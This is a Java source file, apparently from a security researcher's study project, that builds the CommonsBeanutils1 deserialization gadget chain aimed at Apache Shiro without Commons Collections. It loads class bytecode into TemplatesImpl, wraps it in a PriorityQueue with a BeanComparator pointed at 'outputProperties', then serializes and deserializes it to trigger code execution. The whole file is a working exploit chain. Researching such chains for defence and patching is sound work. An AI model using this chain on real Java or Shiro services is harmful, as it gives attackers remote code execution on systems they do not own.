package com.sec.cwm.base.ysoserial;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.springframework.beans.factory.BeanFactoryUtils;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.Collections;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CB1withoutCCforshiro {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static String bytecode(String filename) throws Exception {
        File file=new File(filename);
        FileInputStream fis = new FileInputStream(file);
        byte[] bytes = new byte[(int) file.length()];
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        int a=0;
        while ((a = fis.read(bytes)) != -1) {
            // 截取缓冲区数组中的内容，(bytes, 0, a)其中的0表示从bytes数组的
            // 下标0开始截取，a表示输入流read到的字节数。
            out.write(bytes, 0, a);
        }
        final Base64.Encoder encoder = Base64.getEncoder();
        String encodedText = encoder.encodeToString(bytes);
        return encodedText;
    }
    public static void main(String args[]) throws Exception {
//        String bytecode=bytecode("C:\\Users\\CWM\\IdeaProjects\\test\\src\\main\\java\\com\\sec\\cwm\\base\\HelloTempImpl.class");
        String bytecode=bytecode("../../../../../target/classes/HelloTempImpl.class");
        byte[] code = Base64.getDecoder().decode(bytecode);
        TemplatesImpl templates=new TemplatesImpl();
        setFieldValue(templates,"_bytecodes",new byte[][]{code});
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
        setFieldValue(templates, "_name", "HelloTempImpl");
//        BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        BeanComparator comparator = new BeanComparator(null, java.util.Collections.reverseOrder());
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");
        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        ObjectInputStream ois=new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        ois.readObject();
    }
}
